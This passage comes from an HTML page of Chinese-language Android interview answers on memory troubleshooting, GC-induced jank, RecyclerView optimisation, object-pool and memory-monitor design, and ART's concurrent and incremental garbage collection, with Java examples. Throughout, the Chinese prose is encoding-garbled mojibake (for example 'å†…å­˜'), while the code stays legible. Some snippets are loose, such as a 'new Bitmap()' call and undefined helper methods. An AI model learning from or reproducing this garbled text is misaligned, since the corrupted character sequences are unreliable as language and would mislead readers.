<p><strong>2. åˆ†æå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨MATæ‰“å¼€hprofæ–‡ä»¶</li>
<li>ä½¿ç”¨MATçš„"Histogram"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
</ul>
<p><strong>3. æ‰¾å‡ºæ— æ³•å›æ”¶çš„åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>åˆ†æå¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>æ‰¾å‡ºä¸ºä»€ä¹ˆå¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼š
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šå¯¹è±¡è¢«å¼•ç”¨ï¼Œæ— æ³•å›æ”¶</li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šå¯¹è±¡æœ¬èº«å¾ˆå¤§</li>
<li><strong>å¯¹è±¡å¤ªå¤š</strong>ï¼šåˆ›å»ºäº†å¤ªå¤šå¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>4. ä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼š
<ul>
<li>å¦‚æœæ˜¯å†…å­˜æ³„æ¼ï¼Œä¿®å¤æ³„æ¼</li>
<li>å¦‚æœæ˜¯å¤§å¯¹è±¡ï¼Œä¼˜åŒ–å¤§å¯¹è±¡ï¼ˆå‹ç¼©ã€åŠæ—¶é‡Šæ”¾ï¼‰</li>
<li>å¦‚æœæ˜¯å¯¹è±¡å¤ªå¤šï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</li>
</ul>
</li>
</ul>
<p><strong>å¸¸è§åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><strong>å†…å­˜æ³„æ¼</strong>ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤æ³„æ¼</li>
<li><strong>ä¸€æ¬¡æ€§åŠ è½½å¤ªå¤šæ•°æ®</strong>ï¼šåˆ†æ‰¹åŠ è½½æ•°æ®</li>
<li><strong>å¤§å¯¹è±¡å ç”¨è¿‡å¤šå†…å­˜</strong>ï¼šå‹ç¼©å›¾ç‰‡ã€åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
</ul>
<p><strong>4. å¦‚ä½•æ’æŸ¥GCé¢‘ç¹å¯¼è‡´çš„å¡é¡¿é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. æŸ¥çœ‹GCæ—¥å¿—</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡GCé¢‘ç‡ï¼ˆå¤šä¹…è§¦å‘ä¸€æ¬¡GCï¼‰</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
</ul>
<p><strong>2. ä½¿ç”¨Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceåˆ†æå¡é¡¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´äº†å¡é¡¿</li>
</ul>
<p><strong>3. æ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</strong></p>
<ul>
<li>ä½¿ç”¨Profilerçš„"Allocation Tracking"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«é¢‘ç¹åˆ†é…</li>
<li>åˆ†æä»£ç ï¼Œæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</li>
</ul>
<p><strong>4. ä¼˜åŒ–ä»£ç å‡å°‘GC</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–ä»£ç ï¼š
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><strong>å‡å°‘å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li><strong>é¿å…è§¦å‘Full GC</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ã€å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li><strong>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨</strong>ï¼šViewHolderå¤ç”¨ã€é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
</ul>
<p><strong>5. å¦‚ä½•æ’æŸ¥åˆ—è¡¨æ»‘åŠ¨å¡é¡¿é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. æ£€æŸ¥ViewHolderå¤ç”¨</strong></p>
<ul>
<li>ç¡®ä¿RecyclerViewçš„ViewHolderæ­£ç¡®å¤ç”¨</li>
<li>æ£€æŸ¥Adapterçš„å®ç°æ˜¯å¦æ­£ç¡®</li>
<li>ç¡®ä¿ViewHolderä¸ä¼šè¢«é¢‘ç¹åˆ›å»º</li>
</ul>
<p><strong>2. é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li>onBindViewHolderåœ¨æ»‘åŠ¨æ—¶é¢‘ç¹è°ƒç”¨</li>
<li>ä¸è¦åœ¨è¿™é‡Œåˆ›å»ºæ–°å¯¹è±¡</li>
<li>å¤ç”¨å­—ç¬¦ä¸²ã€é¿å…åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
</ul>
<p><strong>3. ä½¿ç”¨å¯¹è±¡æ± </strong></p>
<ul>
<li>å¯¹äºéœ€è¦é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰å¯¹è±¡æ± ç®¡ç†å¯¹è±¡å¤ç”¨</li>
</ul>
<p><strong>4. å‡å°‘GC</strong></p>
<ul>
<li>é€šè¿‡ä»¥ä¸Šæ–¹æ³•å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>å‡å°‘GCé¢‘ç‡ï¼Œè®©åˆ—è¡¨æ»‘åŠ¨æ›´æµç•…</li>
</ul>
<p><strong>5. ä½¿ç”¨Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceåˆ†æå¡é¡¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œä¼˜åŒ–GC</li>
</ul>
<p><strong>ä¼˜åŒ–ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯¼è‡´å¡é¡¿</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Item "</span> + position));  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
    holder.imageView.setImageBitmap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bitmap</span>());  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…å¡é¡¿</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-string">"Item "</span> + position);  <span class="hljs-comment">// å¤ç”¨å­—ç¬¦ä¸²</span>
    <span class="hljs-comment">// ä½¿ç”¨å›¾ç‰‡ç¼“å­˜ï¼Œé¿å…é¢‘ç¹åˆ›å»ºBitmap</span>
    Glide.with(context).load(url).into(holder.imageView);
}
</code></pre>
<h4 data-id="heading-86">6.3.2 è®¾è®¡é¢˜</h4>
<p><strong>1. å¦‚ä½•è®¾è®¡ä¸€ä¸ªå¯¹è±¡æ± ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å¯¹è±¡æ± çš„æ ¸å¿ƒæ˜¯<strong>å¤ç”¨å¯¹è±¡</strong>ï¼Œé¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯ã€‚</p>
<p><strong>è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<p><strong>1. å®šä¹‰å¯¹è±¡æ± æ¥å£</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectPool</span>&lt;T&gt; {
    T <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// è·å–å¯¹è±¡</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(T obj)</span>; <span class="hljs-comment">// å½’è¿˜å¯¹è±¡</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span>;       <span class="hljs-comment">// æ¸…ç©ºæ± </span>
}
</code></pre>
<p><strong>2. å®ç°å¯¹è±¡å¤ç”¨é€»è¾‘</strong></p>
<ul>
<li>ä½¿ç”¨é˜Ÿåˆ—ï¼ˆQueueï¼‰å­˜å‚¨å¯å¤ç”¨çš„å¯¹è±¡</li>
<li>è·å–æ—¶ä»é˜Ÿåˆ—ä¸­å–å‡ºï¼Œå½’è¿˜æ—¶æ”¾å›é˜Ÿåˆ—</li>
<li>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ›å»ºæ–°å¯¹è±¡</li>
</ul>
<p><strong>3. è®¾ç½®æ± å¤§å°é™åˆ¶</strong></p>
<ul>
<li>é¿å…æ± æ— é™å¢é•¿</li>
<li>è®¾ç½®æœ€å¤§æ± å¤§å°</li>
<li>è¶…è¿‡å¤§å°æ—¶ï¼Œä¸å†å½’è¿˜å¯¹è±¡</li>
</ul>
<p><strong>4. æä¾›è·å–å’Œå½’è¿˜æ–¹æ³•</strong></p>
<ul>
<li>acquire()ï¼šä»æ± ä¸­è·å–å¯¹è±¡ï¼Œå¦‚æœæ± ä¸ºç©ºåˆ™åˆ›å»ºæ–°å¯¹è±¡</li>
<li>release()ï¼šå½’è¿˜å¯¹è±¡åˆ°æ± ä¸­ï¼Œå¦‚æœæ± å·²æ»¡åˆ™ä¸å½’è¿˜</li>
<li>clear()ï¼šæ¸…ç©ºæ± ï¼Œé‡Šæ”¾æ‰€æœ‰å¯¹è±¡</li>
</ul>
<p><strong>å®Œæ•´å®ç°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleObjectPool</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPool</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> Queue&lt;T&gt; pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> maxSize;
    <span class="hljs-keyword">private</span> Supplier&lt;T&gt; factory;  <span class="hljs-comment">// å¯¹è±¡å·¥å‚</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleObjectPool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize, Supplier&lt;T&gt; factory)</span> {
        <span class="hljs-built_in">this</span>.maxSize = maxSize;
        <span class="hljs-built_in">this</span>.factory = factory;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> {
        <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> pool.poll();
        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) {
            obj = factory.get();  <span class="hljs-comment">// æ± ä¸ºç©ºæ—¶åˆ›å»ºæ–°å¯¹è±¡</span>
        }
        <span class="hljs-keyword">return</span> obj;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(T obj)</span> {
        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span> &amp;&amp; pool.size() &lt; maxSize) {
            resetObject(obj);  <span class="hljs-comment">// é‡ç½®å¯¹è±¡çŠ¶æ€</span>
            pool.offer(obj);   <span class="hljs-comment">// å½’è¿˜åˆ°æ± ä¸­</span>
        }
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> {
        pool.clear();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resetObject</span><span class="hljs-params">(T obj)</span> {
        <span class="hljs-comment">// é‡ç½®å¯¹è±¡çŠ¶æ€ï¼Œå‡†å¤‡å¤ç”¨</span>
    }
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¦‚åŠ¨ç”»å¯¹è±¡ã€ä¸´æ—¶å¯¹è±¡ï¼‰</li>
<li>åˆ›å»ºæˆæœ¬é«˜çš„å¯¹è±¡ï¼ˆå¦‚Bitmapã€å¤§å¯¹è±¡ï¼‰</li>
</ul>
<p><strong>2. å¦‚ä½•è®¾è®¡ä¸€ä¸ªå†…å­˜ç›‘æ§ç³»ç»Ÿï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å†…å­˜ç›‘æ§ç³»ç»Ÿéœ€è¦å®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨æƒ…å†µï¼ŒåŠæ—¶å‘ç°é—®é¢˜ã€‚</p>
<p><strong>è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<p><strong>1. å®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>ä½¿ç”¨Runtime.getRuntime()è·å–å†…å­˜ä¿¡æ¯</li>
<li>å®šæœŸé‡‡é›†å†…å­˜ä½¿ç”¨æ•°æ®</li>
<li>è®°å½•å†…å­˜ä½¿ç”¨æ›²çº¿</li>
</ul>
<p><strong>2. è®°å½•GCäº‹ä»¶</strong></p>
<ul>
<li>ç›‘å¬GCäº‹ä»¶ï¼ˆé€šè¿‡GCæ—¥å¿—æˆ–Profilerï¼‰</li>
<li>è®°å½•GCç±»å‹ã€GCè€—æ—¶ã€GCé¢‘ç‡</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
</ul>
<p><strong>3. åˆ†æå†…å­˜è¶‹åŠ¿</strong></p>
<ul>
<li>åˆ†æå†…å­˜ä½¿ç”¨è¶‹åŠ¿</li>
<li>è¯†åˆ«å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æŒç»­å¢é•¿ï¼‰</li>
<li>é¢„æµ‹OOMé£é™©</li>
</ul>
<p><strong>4. è®¾ç½®å‘Šè­¦é˜ˆå€¼</strong></p>
<ul>
<li>è®¾ç½®å†…å­˜ä½¿ç”¨å‘Šè­¦é˜ˆå€¼</li>
<li>è®¾ç½®GCé¢‘ç‡å‘Šè­¦é˜ˆå€¼</li>
<li>è¶…è¿‡é˜ˆå€¼æ—¶å‘é€å‘Šè­¦</li>
</ul>
<p><strong>å®ç°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryMonitor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">MEMORY_WARNING_THRESHOLD</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;  <span class="hljs-comment">// 80MB</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">GC_FREQUENCY_THRESHOLD</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">// æ¯ç§’10æ¬¡</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();
        <span class="hljs-type">long</span> <span class="hljs-variable">usedMemory</span> <span class="hljs-operator">=</span> runtime.totalMemory() - runtime.freeMemory();
        <span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> runtime.maxMemory();
        
        <span class="hljs-comment">// æ£€æŸ¥å†…å­˜ä½¿ç”¨</span>
        <span class="hljs-keyword">if</span> (usedMemory &gt; MEMORY_WARNING_THRESHOLD) {
            sendWarning(<span class="hljs-string">"å†…å­˜ä½¿ç”¨è¿‡é«˜: "</span> + usedMemory);
        }
        
        <span class="hljs-comment">// æ£€æŸ¥GCé¢‘ç‡</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">gcFrequency</span> <span class="hljs-operator">=</span> getGCFrequency();
        <span class="hljs-keyword">if</span> (gcFrequency &gt; GC_FREQUENCY_THRESHOLD) {
            sendWarning(<span class="hljs-string">"GCè¿‡äºé¢‘ç¹: "</span> + gcFrequency + <span class="hljs-string">"æ¬¡/ç§’"</span>);
        }
    }
}
</code></pre>
<p><strong>3. å¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å†…å­˜æ•ˆç‡çš„Androidåº”ç”¨ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>é«˜å†…å­˜æ•ˆç‡çš„åº”ç”¨éœ€è¦ä»å¤šä¸ªæ–¹é¢ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚</p>
<p><strong>è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<p><strong>1. å‡å°‘å¯¹è±¡åˆ›å»ºï¼ˆä½¿ç”¨å¯¹è±¡æ± ï¼‰</strong></p>
<ul>
<li>å¯¹äºé¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>å¤ç”¨å¯¹è±¡ï¼Œé¿å…é¢‘ç¹åˆ›å»ºé”€æ¯</li>
<li>ç¤ºä¾‹ï¼šåŠ¨ç”»å¯¹è±¡ã€ä¸´æ—¶å¯¹è±¡</li>
</ul>
<p><strong>2. é¿å…å†…å­˜æ³„æ¼ï¼ˆæ­£ç¡®ç®¡ç†ç”Ÿå‘½å‘¨æœŸï¼‰</strong></p>
<ul>
<li>æ­£ç¡®å¤„ç†Activityã€Fragmentçš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>åœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li>ä½¿ç”¨å¼±å¼•ç”¨é¿å…å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>3. åˆç†ä½¿ç”¨ç¼“å­˜ï¼ˆLruCacheï¼‰</strong></p>
<ul>
<li>ä½¿ç”¨LruCacheç­‰æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li>åŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜</li>
<li>é¿å…æ— é™åˆ¶ç¼“å­˜</li>
</ul>
<p><strong>4. åŠæ—¶é‡Šæ”¾èµ„æº</strong></p>
<ul>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼ˆå¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li>å…³é—­æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥</li>
<li>æ¸…ç†é›†åˆã€å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
</ul>
<p><strong>5. ä¼˜åŒ–æ•°æ®ç»“æ„</strong></p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„é›†åˆç±»</li>
<li>é¿å…å†…å­˜æµªè´¹</li>
<li>åŠæ—¶æ¸…ç†é›†åˆ</li>
</ul>
<p><strong>6. ç›‘æ§å’Œè°ƒä¼˜</strong></p>
<ul>
<li>ä½¿ç”¨Profilerç›‘æ§å†…å­˜ä½¿ç”¨</li>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>æ ¹æ®å®é™…æƒ…å†µä¼˜åŒ–</li>
</ul>
<p><strong>è®¾è®¡åŸåˆ™ï¼š</strong></p>
<ul>
<li><strong>æœ€å°åŒ–å¯¹è±¡åˆ›å»º</strong>ï¼šå‡å°‘å¯¹è±¡åˆ†é…ï¼Œå‡å°‘GC</li>
<li><strong>åŠæ—¶é‡Šæ”¾èµ„æº</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ï¼Œé¿å…OOM</li>
<li><strong>åˆç†ä½¿ç”¨ç¼“å­˜</strong>ï¼šä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li><strong>ç›‘æ§å’Œä¼˜åŒ–</strong>ï¼šæŒç»­ç›‘æ§ï¼ŒæŒç»­ä¼˜åŒ–</li>
</ul>
<h4 data-id="heading-87">6.3.3 æ·±å…¥åŸç†é¢˜ï¼ˆé«˜çº§ï¼‰</h4>
<p><strong>1. ARTå¹¶å‘å¤åˆ¶æ”¶é›†å™¨æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>ARTå¹¶å‘å¤åˆ¶æ”¶é›†å™¨çš„å·¥ä½œæµç¨‹ï¼š</p>
<p><strong>1. å¹¶å‘æ ‡è®°ï¼ˆConcurrent Markingï¼‰</strong></p>
<ul>
<li>åœ¨åå°çº¿ç¨‹æ‰§è¡Œæ ‡è®°å·¥ä½œ</li>
<li>ä»GC Rootså¼€å§‹ï¼Œæ ‡è®°æ‰€æœ‰å­˜æ´»å¯¹è±¡</li>
<li>ä¸»çº¿ç¨‹ç»§ç»­è¿è¡Œï¼Œä¸æš‚åœ</li>
</ul>
<p><strong>2. å¹¶å‘å¤åˆ¶ï¼ˆConcurrent Copyingï¼‰</strong></p>
<ul>
<li>åœ¨åå°çº¿ç¨‹æ‰§è¡Œå¤åˆ¶å·¥ä½œ</li>
<li>å°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°æ–°ä½ç½®</li>
<li>ä¸»çº¿ç¨‹ç»§ç»­è¿è¡Œï¼Œä¸æš‚åœ</li>
</ul>
<p><strong>3. å‡å°‘ä¸»çº¿ç¨‹æš‚åœæ—¶é—´</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†å·¥ä½œåœ¨åå°çº¿ç¨‹æ‰§è¡Œ</li>
<li>ä¸»çº¿ç¨‹åªåœ¨å¿…è¦æ—¶çŸ­æš‚æš‚åœ</li>
<li>å‡å°‘å¡é¡¿ï¼Œæå‡ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>4. é€‚åˆäº¤äº’å¼åº”ç”¨</strong></p>
<ul>
<li>Androidåº”ç”¨æ˜¯äº¤äº’å¼åº”ç”¨ï¼Œéœ€è¦ä½å»¶è¿Ÿ</li>
<li>å¹¶å‘å›æ”¶å‡å°‘æš‚åœæ—¶é—´ï¼Œé€‚åˆäº¤äº’å¼åº”ç”¨</li>
<li>ä¼˜åŒ–ç”¨æˆ·æ»‘åŠ¨ã€ç‚¹å‡»ç­‰æ“ä½œçš„æµç•…åº¦</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è§¦å‘GC
<span class="hljs-bullet">2.</span> åå°çº¿ç¨‹ï¼šå¹¶å‘æ ‡è®°å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">3.</span> åå°çº¿ç¨‹ï¼šå¹¶å‘å¤åˆ¶å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">4.</span> ä¸»çº¿ç¨‹ï¼šçŸ­æš‚æš‚åœï¼Œå®Œæˆæœ€åçš„åŒæ­¥å·¥ä½œ
<span class="hljs-bullet">5.</span> ä¸»çº¿ç¨‹ï¼šç»§ç»­è¿è¡Œ
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>å‡å°‘ä¸»çº¿ç¨‹æš‚åœæ—¶é—´</li>
<li>æå‡åº”ç”¨æµç•…åº¦</li>
<li>é€‚åˆäº¤äº’å¼åº”ç”¨</li>
</ul>
<p><strong>2. å¢é‡å›æ”¶æ˜¯å¦‚ä½•å‡å°‘å¡é¡¿çš„ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å¢é‡å›æ”¶çš„æ ¸å¿ƒæ€æƒ³æ˜¯<strong>æŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå°ä»½ï¼Œåˆ†æ‰¹æ‰§è¡Œ</strong>ã€‚</p>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<p><strong>1. åˆ†æ‰¹æ‰§è¡Œ</strong></p>
<ul>
<li>æŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå¤šä¸ªå°ä»»åŠ¡</li>
<li>æ¯æ¬¡åªæ‰§è¡Œä¸€å°éƒ¨åˆ†</li>
<li>é¿å…ä¸€æ¬¡æ€§æ‰§è¡Œæ‰€æœ‰å›æ”¶å·¥ä½œ</li>
</ul>
<p><strong>2. æ¯æ¬¡æš‚åœæ—¶é—´çŸ­</strong></p>
<ul>
<li>æ¯æ¬¡åªæ‰§è¡Œä¸€å°éƒ¨åˆ†ï¼Œæš‚åœæ—¶é—´çŸ­</li>
<li>ç”¨æˆ·å‡ ä¹æ„Ÿè§‰ä¸åˆ°å¡é¡¿</li>
<li>å¤šæ¬¡çŸ­æš‚åœæ¯”ä¸€æ¬¡é•¿æš‚åœä½“éªŒæ›´å¥½</li>
</ul>
<p><strong>3. é¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</strong></p>
<ul>
<li>ä¼ ç»Ÿå›æ”¶ï¼šä¸€æ¬¡æ€§å›æ”¶æ‰€æœ‰å¯¹è±¡ï¼Œæš‚åœæ—¶é—´é•¿ï¼ˆå¯èƒ½50msï¼‰</li>
<li>å¢é‡å›æ”¶ï¼šåˆ†æˆå¤šæ¬¡ï¼Œæ¯æ¬¡æš‚åœæ—¶é—´çŸ­ï¼ˆå¯èƒ½5msï¼‰</li>
<li>ç”¨æˆ·æ„Ÿè§‰ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">ä¼ ç»Ÿå›æ”¶ï¼š
<span class="hljs-selector-attr">[ä¸€æ¬¡æ€§å›æ”¶æ‰€æœ‰å¯¹è±¡]</span>
æš‚åœæ—¶é—´ï¼š<span class="hljs-number">50ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šæ˜æ˜¾å¡é¡¿

å¢é‡å›æ”¶ï¼š
<span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span>
æ¯æ¬¡æš‚åœï¼š<span class="hljs-number">5ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>å‡å°‘å•æ¬¡æš‚åœæ—¶é—´</li>
<li>æå‡ç”¨æˆ·ä½“éªŒ</li>
<li>é€‚åˆäº¤äº’å¼åº”ç”¨</li>
</ul>
